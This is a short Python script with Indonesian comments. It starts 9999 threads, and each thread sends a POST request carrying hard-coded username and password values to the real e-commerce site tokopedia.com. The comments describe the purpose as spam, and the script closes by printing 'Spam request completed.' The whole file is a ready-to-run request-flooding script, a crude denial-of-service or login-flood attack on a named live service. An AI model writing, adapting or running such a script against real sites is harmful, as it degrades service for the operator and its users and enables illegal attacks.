import requests # type: ignore
import threading

# URL endpoint login
url = "https://www.tokopedia.com"

# Data login
data = {
    "username": "20210801052",
    "password": "2093021"
}

# Fungsi untuk mengirimkan permintaan POST
def send_post_request():
    try:
        response = requests.post(url, data=data)
        print(f"Status Code: {response.status_code}")
    except Exception as e:
        print(f"Request failed: {e}")

# Jumlah thread yang akan digunakan untuk spam
num_threads = 9999

# Membuat dan memulai thread
threads = []
for _ in range(num_threads):
    thread = threading.Thread(target=send_post_request)
    thread.start()
    threads.append(thread)

# Menunggu semua thread selesai
for thread in threads:
    thread.join()

print("Spam request completed.")
